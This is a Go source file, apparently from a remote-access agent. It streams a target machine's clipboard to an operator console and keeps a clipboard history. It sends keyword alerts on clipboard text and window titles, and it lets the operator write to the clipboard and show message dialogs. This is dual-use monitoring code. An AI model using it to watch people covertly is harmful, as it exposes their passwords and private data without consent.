package main

import (
	"strings"
	"sync"
	"time"
)

// clipboardPollInterval is how often the target clipboard is compared against
// the last value sent. Polling (instead of a Win32 clipboard-viewer chain)
// keeps one implementation for every platform and costs one hash per tick.
const clipboardPollInterval = 1500 * time.Millisecond

// Clipboard history bounds. The value cap matches one clipboard frame; the
// list cap keeps the whole history under ~1.3 MiB of host memory and one
// history frame under a few KiB (the list carries previews, not values).
const (
	maxClipboardHistory  = 20
	clipboardPreviewLen  = 160
	clipboardHistoryPage = 20
)

// clipboardHistoryEntry is one remembered clipboard value.
type clipboardHistoryEntry struct {
	text string
	at   time.Time
}

var (
	clipHistMu sync.Mutex
	clipHist   []clipboardHistoryEntry // oldest first; newest at the end
)

// clipboardHistoryRecord remembers one value: consecutive duplicates are
// ignored (a poll that sees the same text must not fill the history), and the
// oldest entry is evicted once the cap is reached.
func clipboardHistoryRecord(text string, at time.Time) {
	if text == "" {
		return
	}
	if len(text) > MaxClipboardBytes {
		text = text[:MaxClipboardBytes]
	}
	clipHistMu.Lock()
	defer clipHistMu.Unlock()
	if n := len(clipHist); n > 0 && clipHist[n-1].text == text {
		return
	}
	clipHist = append(clipHist, clipboardHistoryEntry{text: text, at: at})
	if len(clipHist) > maxClipboardHistory {
		clipHist = clipHist[len(clipHist)-maxClipboardHistory:]
	}
}

// clipboardHistorySnapshot returns up to limit entries, newest first. Index 0
// is always the newest, which is what the console shows on top.
func clipboardHistorySnapshot(limit int) []clipboardHistoryEntry {
	if limit <= 0 || limit > maxClipboardHistory {
		limit = clipboardHistoryPage
	}
	clipHistMu.Lock()
	defer clipHistMu.Unlock()
	out := make([]clipboardHistoryEntry, 0, limit)
	for i := len(clipHist) - 1; i >= 0 && len(out) < limit; i-- {
		out = append(out, clipHist[i])
	}
	return out
}

// clipboardHistoryAt resolves one entry by its newest-first index.
func clipboardHistoryAt(index int) (clipboardHistoryEntry, bool) {
	clipHistMu.Lock()
	defer clipHistMu.Unlock()
	pos := len(clipHist) - 1 - index
	if index < 0 || pos < 0 || pos >= len(clipHist) {
		return clipboardHistoryEntry{}, false
	}
	return clipHist[pos], true
}

// clipboardHistoryTotal returns how many values are remembered.
func clipboardHistoryTotal() int {
	clipHistMu.Lock()
	defer clipHistMu.Unlock()
	return len(clipHist)
}

// clipboardPreviewText flattens a value into one short line for the history
// list. It slices by rune so a multi-byte character is never split.
func clipboardPreviewText(text string) string {
	flat := strings.Join(strings.Fields(text), " ")
	runes := []rune(flat)
	if len(runes) <= clipboardPreviewLen {
		return flat
	}
	return string(runes[:clipboardPreviewLen]) + "…"
}

// clipboardWatcher publishes the target clipboard when it changes. It sends the
// current value once on connect (so the console shows what is already there),
// then only on a hash change, and never while watching is disabled.
func (s *agentWebRTCSession) clipboardWatcher() {
	ticker := time.NewTicker(clipboardPollInterval)
	defer ticker.Stop()
	s.publishClipboard(false)
	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.publishClipboard(false)
			// Keyword watch: the clipboard value is already read once in
			// publishClipboard; window title is cheap and checked on the same
			// tick. Both go through the same bounded, rate-limited emitter.
			cfg := s.keywordAlertSnapshot()
			if cfg.Enabled && cfg.WindowTitle {
				if title := getActiveWindowTitle(); title != "" {
					s.maybeKeywordAlert("window", title, time.Now())
				}
			}
		}
	}
}

// publishClipboard reads, sanitizes and (if changed or forced) sends the target
// clipboard. Read failures are silent: an empty or non-text clipboard is the
// normal state, not an error the operator needs every 1.5 seconds.
func (s *agentWebRTCSession) publishClipboard(force bool) {
	raw, err := clipboardGet()
	if err != nil {
		return
	}
	text, truncated := sanitizeClipboardText(raw)
	hash := clipboardHash(text)

	s.clipMu.Lock()
	if !s.clipWatch && !force {
		s.clipMu.Unlock()
		return
	}
	if !force && hash == s.clipLastHash {
		s.clipMu.Unlock()
		return
	}
	s.clipLastHash = hash
	s.clipMu.Unlock()

	now := time.Now()
	clipboardHistoryRecord(text, now)
	_ = s.sendJSON(map[string]any{
		"type":      "clipboard",
		"text":      text,
		"source":    "agent",
		"truncated": truncated,
	})
	if cfg := s.keywordAlertSnapshot(); cfg.Enabled && cfg.Clipboard {
		s.maybeKeywordAlert("clipboard", text, now)
	}
}

// deliverMessage validates and shows an operator chat message, then reports
// the outcome. The report is what makes the feature trustworthy: without it an
// operator cannot tell "the target dismissed it" from "the dialog never
// appeared".
func (s *agentWebRTCSession) deliverMessage(title, text string) {
	cleaned, err := sanitizeRemoteMessage(text)
	if err != nil {
		_ = s.sendJSON(map[string]any{"type": "message_status", "status": "failed", "reason": err.Error()})
		return
	}
	title = sanitizeRemoteMessageTitle(title)
	if err := showRemoteMessage(title, cleaned); err != nil {
		_ = s.sendJSON(map[string]any{"type": "message_status", "status": "failed", "reason": err.Error()})
		return
	}
	_ = s.sendJSON(map[string]any{"type": "message_status", "status": "shown", "bytes": len(cleaned)})
}

// applyClipboardSet writes operator text into the target clipboard, remembers
// its hash (so the watcher does not echo the operator's own paste back), and
// confirms with the value the target now holds.
func (s *agentWebRTCSession) applyClipboardSet(raw string) {
	text, err := prepareClipboardWrite(raw)
	if err != nil {
		_ = s.sendJSON(map[string]any{"type": "clipboard_error", "reason": err.Error()})
		return
	}
	if err := clipboardSet(text); err != nil {
		_ = s.sendJSON(map[string]any{
			"type":   "clipboard_error",
			"reason": "clipboard write failed: " + err.Error(),
		})
		return
	}
	s.clipMu.Lock()
	s.clipLastHash = clipboardHash(text)
	s.clipMu.Unlock()
	clipboardHistoryRecord(text, time.Now())
	_ = s.sendJSON(map[string]any{
		"type":      "clipboard",
		"text":      text,
		"source":    "operator",
		"truncated": false,
	})
}

// clipboardHistoryList answers a history request with previews only: the list
// frame must stay small even when 20 values are 64 KiB each.
func (s *agentWebRTCSession) clipboardHistoryList(limit int) {
	entries := clipboardHistorySnapshot(limit)
	items := make([]map[string]any, 0, len(entries))
	for i, entry := range entries {
		items = append(items, map[string]any{
			"index":   i,
			"preview": clipboardPreviewText(entry.text),
			"bytes":   len(entry.text),
			"at":      entry.at.UTC().Format(time.RFC3339),
		})
	}
	_ = s.sendJSON(map[string]any{
		"type":  "clipboard_history",
		"items": items,
		"total": clipboardHistoryTotal(),
	})
}

// clipboardHistoryFetch sends one full remembered value. The console uses it to
// load an entry into the strip, then Copy/Paste as usual.
func (s *agentWebRTCSession) clipboardHistoryFetch(index int) {
	entry, ok := clipboardHistoryAt(index)
	if !ok {
		_ = s.sendJSON(map[string]any{"type": "clipboard_error", "reason": "clipboard history index out of range"})
		return
	}
	_ = s.sendJSON(map[string]any{
		"type":      "clipboard",
		"text":      entry.text,
		"source":    "history",
		"truncated": false,
	})
}

// setClipboardWatch enables or disables change streaming.
func (s *agentWebRTCSession) setClipboardWatch(enabled bool) {
	s.clipMu.Lock()
	s.clipWatch = enabled
	s.clipMu.Unlock()
	if enabled {
		s.publishClipboard(true)
	}
}
